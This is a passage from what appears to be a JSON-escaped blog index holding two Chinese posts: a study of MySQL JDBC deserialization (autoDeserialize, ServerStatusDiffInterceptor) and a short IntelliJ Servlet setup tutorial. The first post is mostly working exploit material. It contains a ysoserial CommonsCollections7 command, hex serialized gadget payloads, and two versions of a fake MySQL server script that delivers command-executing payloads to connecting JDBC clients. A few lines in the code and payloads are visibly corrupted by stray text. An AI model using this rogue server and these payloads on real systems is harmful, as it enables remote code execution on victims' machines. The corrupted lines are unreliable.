6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278; INSERT INTO test.eviltable(`evil_2`) VALUES (@obj); 该数据是由执行以下命令生成的\njava8 -jar ysoserial.jar CommonsCollections7 \u0026#34;touch /tmp/cc7\u0026#34; | xxd -ps -c 200 | tr -d \u0026#39;\\n\u0026#39; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; public class main { public static void main(String[] args) throws Exception{ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); String jdbc_url = \u0026#34;jdbc:mysql://192.168.31.119:3306/test?\u0026#34; + \u0026#34;autoDeserialize=true\u0026#34; + \u0026#34;\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;; Connection con = DriverManager.getConnection(jdbc_url,\u0026#34;xxxx\u0026#34;,\u0026#34;toor\u0026#34;); PreparedStatement ptmt = con.prepareStatement(\u0026#34;select evil from eviltable ;\u0026#34;); ResultSet rs = ptmt.executeQuery(); rs.next(); rs.getObject(1); } } 启动wireshark进行抓包，设置过滤规则mysql\n图中选中的数据包就是执行select evil from eviltable ;后返回的数据，也就是刚才生成的数据。将其复制出来，并删除mysql之外的数据，得到如下数据\n01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000 该数据在jdbc端被反序列化后触发了漏洞。\n这只是普通的反序列化，要在jdbc连接的过程中触发反序列化，首先来看com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()\npublic class ServerStatusDiffInterceptor implements QueryInterceptor { ... public \u0026lt;T extends Resultset\u0026gt; T postProcess(Supplier\u0026lt;String\u0026gt; sql, Query interceptedQuery, T originalResultSet, ServerSession serverSession) { this.populateMapWithSessionStatusValues(this.postExecuteValues); this.log.logInfo(\u0026#34;Server status change for query:\\n\u0026#34; + Util.calculateDifferences(this.preExecuteValues, this.postExecuteValues)); return null; } private void populateMapWithSessionStatusValues(Map\u0026lt;String, String\u0026gt; toPopulate) { Statement stmt = null; ResultSet rs = null; try { try { toPopulate.clear(); stmt = this.connection.createStatement(); rs = stmt.executeQuery(\u0026#34;SHOW SESSION STATUS\u0026#34;); ResultSetUtil.resultSetToMap(toPopulate, rs); } finally { if (rs != null) { rs.close(); } if (stmt != null) { stmt.close(); } } } catch (SQLException var8) { throw ExceptionFactory.createException(var8.getMessage(), var8); } } ... } ServerStatusDiffInterceptor是一个实现了QueryInterceptor接口的拦截器，当queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor的时候就会经过这个拦截器，并调用这个拦截器的preProcess方法和 postProcess方法。\n可以看到SHOW SESSION STATUS语句请求的结果进入了 com.mysql.cj.jdbc.util.ResultSetUtil 的 resultSetToMap方法中。跟进看看\npublic class ResultSetUtil { public ResultSetUtil() { } public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException { while(rs.next()) { mappedValues.put(rs.getObject(1), rs.getObject(2)); } } ... } 调用了 com.mysql.cj.jdbc.result.ResultSetImpl的getObject方法\npublic Object getObject(int columnIndex) throws SQLException { try { this.checkRowPos(); this.checkColumnBounds(columnIndex); int columnIndexMinusOne = columnIndex - 1; if (this.thisRow.getNull(columnIndexMinusOne)) { return null; } else { Field field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch(field.getMysqlType()) { case BIT: if (!field.isBinary() \u0026amp;\u0026amp; !field.isBlob()) { return field.isSingleBit() ? this.getBoolean(columnIndex) : this.getBytes(columnIndex); } else { byte[] data = this.getBytes(columnIndex); if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(\u0026#34;autoDeserialize\u0026#34;).getValue()) { return data; } else { Object obj = data; if (data != null \u0026amp;\u0026amp; data.length \u0026gt;= 2) { if (data[0] != -84 || data[1] != -19) { return this.getString(columnIndex); } try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException var13) { throw SQLError.createSQLException(Messages.getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) + var13.toString() + Messages.getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), this.getExceptionInterceptor()); } catch (IOException var14) { obj = data; } } return obj; } } ... } } } } 这里进行了一个判断，在autoDeserialize=true的情况下会对数据进行反序列化。\n那么链条就会比较清晰了，接下来是怎么伪造一个mysql服务端来和jdbc客户端进行数据交互，并在客户端发送SHOW SESSION STATUS的时候将payload发送给客户端触发反序列化漏洞。这里通过观察wireshark数据包简单分析一下\n首先是greeting，然后jdbc发送登陆请求，服务端返回Response OK数据，这个Response OK在后面的数据交互中多次用到，需要我们伪造的mysql服务端用来进行数据返回。在经过一些数据协商后，来到SHOW SESSION STATUS部分，我们伪造的mysql服务端就可以发送真正的payload给jdbc客户端来进行反序列化了。\n漏洞利用 这里直接拿别的师傅的脚本，从https://xz.aliyun.com/t/8159#toc-1 这里拿的\n# -*- coding:utf-8 -*- #@Time : 2020/7/27 2:10 #@Author: Tri0mphe7 #@File : server.py import socket import binascii import os greeting_data=\u0026#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\u0026#34; response_ok_data=\u0026#34;0700000200000002000000\u0026#34; def receive_data(conn): data = conn.recv(1024) print(\u0026#34;[*] Receiveing the package : {}\u0026#34;.format(data)) return str(data).lower() def send_data(conn,data): print(\u0026#34;[*] Sending the package : {}\u0026#34;.format(data)) conn.send(binascii.a2b_hex(data)) def get_payload_content(): # file文件的内容使用ysoserial生成的 使用规则 java -jar ysoserial [common7那个] \u0026#34;calc\u0026#34; \u0026gt; a file= r\u0026#39;a\u0026#39; if os.path.isfile(file): with open(file, \u0026#39;rb\u0026#39;) as f: payload_content = str(binascii.b2a_hex(f.read()),encoding=\u0026#39;utf-8\u0026#39;) print(\u0026#34;open successs\u0026#34;) else: print(\u0026#34;open false\u0026#34;) #calc payload_content=\u0026#39;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878\u0026#39; return payload_content # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\u0026#34;Connection come from {}:{}\u0026#34;.format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \u0026#34;session.auto_increment_increment\u0026#34; in data: _payload=\u0026#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c21的0009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000\u0026#39; send_data(conn,_payload) data=receive_data(conn) elif \u0026#34;show warnings\u0026#34; in data: _payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000\u0026#39; send_data(conn, _payload) data = receive_data(conn) if \u0026#34;set names\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;set character_set_results\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;show session status\u0026#34; in data: mysql_data = \u0026#39;0100000102\u0026#39; mysql_data += \u0026#39;1a000002036465660001630163016301630c3f00ffff0000fc9000000000\u0026#39; mysql_data += \u0026#39;1a000003036465660001630163016301630c3f00ffff0000fc9000000000\u0026#39; # 为什么我加了EOF Packet 就无法正常运行呢？？ # 获取payload payload_content=get_payload_content() # 计算payload长度 payload_length = str(hex(len(payload_content)//2)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # 计算数据包长度 data_len = str(hex(len(payload_content)//2 + 4)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + \u0026#39;04\u0026#39; + \u0026#39;fbfc\u0026#39;+ payload_length_hex mysql_data += str(payload_content) mysql_data += \u0026#39;07000005fe000022000100\u0026#39; send_data(conn, mysql_data) data = receive_data(conn) if \u0026#34;show warnings\u0026#34; in data: payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535show session status441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000\u0026#39; send_data(conn, payload) break if __name__ == \u0026#39;__main__\u0026#39;: HOST =\u0026#39;0.0.0.0\u0026#39; PORT = 3309 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\u0026#34;start fake mysql server listening on {}:{}\u0026#34;.format(HOST,PORT)) run() 经过之前的分析，这个脚本是不难看懂的，但是该工具在我这里使用的时候无法复现，原因在于show session status之后发送的payload有误，那怎么办呢？毕竟要修改这部分代码是需要对mysql发送的数据包格式进行一个系统的了解和认识的，关于数据包格式，在https://xz.aliyun.com/t/8159#toc-1 这篇文章中有分析到，但我无意对数据包格式作深究，于是用了一个比较偷懒的办法。\n还记得之前用jdbc将payload请求回本地并进行手动反序列化时候的操作吗，我们可以从wireshark中将那个数据包中的数据copy下来，删除mysql数据以外的数据，然后加入到脚本中，那么脚本进过修改之后如下所示。\n# -*- coding:utf-8 -*- #@Time : 2020/7/27 2:10 #@Author: Tri0mphe7 #@File : server.py import socket import binascii import os greeting_data=\u0026#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\u0026#34; response_ok_data=\u0026#34;0700000200000002000000\u0026#34; def receive_data(conn): data = conn.recv(1024) print(\u0026#34;[*] Receiveing the package : {}\u0026#34;.format(data)) return str(data).lower() def send_data(conn,data): print(\u0026#34;[*] Sending the package : {}\u0026#34;.format(data)) conn.send(binascii.a2b_hex(data))朋友他好哦你 # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\u0026#34;Connection come from {}:{}\u0026#34;.format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \u0026#34;session.auto_increment_increment\u0026#34; in data: _payload=\u0026#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000\u0026#39; send_data(conn,_payload) data=receive_data(conn) elif \u0026#34;show warnings\u0026#34; in data: _payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000\u0026#39; send_data(conn, _payload) data = receive_data(conn) if \u0026#34;set names\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;set character_set_results\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;show session status\u0026#34; in data: mydata = \u0026#39;01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000\u0026#39; send_data(conn, mydata) data = receive_data(conn) if \u0026#34;show warnings\u0026#34; in data: payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000\u0026#39; send_data(conn, payload) break if __name__ == \u0026#39;__main__\u0026#39;: HOST =\u0026#39;0.0.0.0\u0026#39; PORT = 3309 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\u0026#34;start fake mysql server listening on {}:{}\u0026#34;.format(HOST,PORT)) run() 诚然，这种方法是没有上一个脚本来得自动化的，但是比较方便复现。\n","permalink":"https://ch3n9w.github.io/posts/sec-jdbc-unserialize/","summary":"\u003cblockquote\u003e\n\u003cp\u003e我终于更新博客了……\u003c/p\u003e\n\u003c/blockquote\u003e","title":"mysql jdbc反序列化的不深入研究"},{"content":"采用的是版本较新的idea2020.2, 使用的操作系统为MANJARO LINUX, 其中的过程挺迷迷糊糊的就水一篇来记录一下.\nFile --\u0026gt; New --\u0026gt; Project --\u0026gt; Java --\u0026gt; Nextnext 新建一个项目 右键Project --\u0026gt; open module setting --\u0026gt; 点击+号 --\u0026gt; 导入tomcat8的Servlet-api.jar 右键项目 --\u0026gt; Add Frameworks Support --\u0026gt; 选中web application 选中后会多出来几个东西, 如下图, 多了WEB-INF目录和index.jsp\nWeb-INF里面有只有一个web.xml, 什么是WEB-INF? 根据百度百科的介绍\nWEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\nWEB-INF文件夹下除了web.xml外，还存一个classes文件夹，用以放置 *.class文件，这些 *.class文件是网站设计人员编写的类库，实现了jsp页面前台美工与后台服务的分离，使得网站的维护非常方便。web.xml文件为网站部署描述XML文件，对网站的部署非常重要。\nWeb-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有lib文件夹（用于存放需要的jar包）（用于配置，比如说用来配置过滤器等。）\n/WEB-INF/src/ 源码目录，按照包名结构放置各个java文件。\n/WEB-INF/database.properties 数据库配置文件\n/WEB-INF/tags/\n存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：\u0026lt;%@ taglibprefix=\u0026ldquo;tags\u0026rdquo; tagdir=\u0026quot;/WEB-INF /simpleTags\u0026quot; % \u0026gt;。\n/WEB-INF/jsp/\njsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。\n/WEB-INF/jsp2/\n与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。\nMETA-INF\n相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务 manifest.mf文件，在用jar打包时自动生成。\n最重要的是classes文件夹和lib文件夹, 所以新建两个文件夹, 一个是classes, 另一个是lib, 配置项目结构让编译出来的class文件输出到classes中去\n然后在src目录下面编写TestServlet.java文件\nimport javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(\u0026#34;/TestServlet\u0026#34;) public class TestServelet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException { resp.getWriter().write(\u0026#34;my first servlet\u0026#34;); } } 然后添加运行配置, 在Manjaro linux里面tomcat的目录是/usr/share/tomcat8/, ps: 为了不和burpsuite的默认端口冲突, 我将tomcat服务的默认端口设置在了8081.\n如果有提示错误的化就点击fix去修复, 然后在Development下面修改context, 这样就可以通过http://localhost:8081/MyServlet访问到服务了.\n点击运行就可以启动Tomcat服务器了.\n","permalink":"https://ch3n9w.github.io/posts/tech-idea-start-servlet/","summary":"\u003cp\u003e采用的是版本较新的idea2020.2, 使用的操作系统为\u003ccode\u003eMANJARO LINUX\u003c/code\u003e, 其中的过程挺迷迷糊糊的就水一篇来记录一下.\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eFile --\u0026gt; New --\u0026gt; Project --\u0026gt; Java --\u0026gt; Nextnext 新建一个项目\n\u003c/code\u003e\u003c/pre\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e右键Project --\u0026gt; open module setting --\u0026gt; 点击+号 --\u0026gt; 导入tomcat8的Servlet-api.jar \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141517710.png\" alt=\"image-20211114141517710\"  /\u003e\n\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e右键项目 